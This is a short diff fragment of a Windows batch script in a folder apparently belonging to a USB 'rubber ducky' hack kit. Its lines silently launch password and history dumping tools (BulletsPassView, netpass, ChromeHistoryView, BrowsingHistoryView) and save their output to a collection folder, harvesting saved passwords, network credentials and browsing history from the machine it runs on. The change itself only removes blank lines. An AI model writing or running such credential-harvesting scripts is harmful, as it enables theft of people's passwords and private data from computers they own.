@@ -25,30 +25,3 @@ start %~dp0MrGraysRubberHack\ChromeHistoryView.exe /stext %dst%\ChromeHistoryVie
 start %~dp0MrGraysRubberHack\BulletsPassView.exe /stext %dst%\BulletsPassView.txt
 start %~dp0MrGraysRubberHack\BrowsingHistoryView.exe /stext %dst%\BrowsingHistoryView.txt
 start %~dp0MrGraysRubberHack\netpass.exe /stext %dst%\netpass.txt
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
